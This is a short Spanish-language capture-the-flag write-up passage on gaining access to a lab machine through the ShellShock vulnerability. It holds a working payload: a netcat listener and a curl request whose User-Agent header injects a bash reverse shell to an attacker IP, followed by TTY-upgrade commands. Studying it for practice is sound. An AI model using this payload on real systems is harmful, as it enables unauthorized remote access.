## Vuln exploit & Gaining Access {-}

### Ganando accesso desde la vulnerabilidad ShellShock {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Entablamos una reverse shell

    ```bash
    curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /bin/bash -i >& /dev/tcp/10.10.14.7/443 0>&1
    ```

Hemos ganado accesso al systema.


### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a `whoami` vemos que ya estamos shelly y que podemos leer la flag.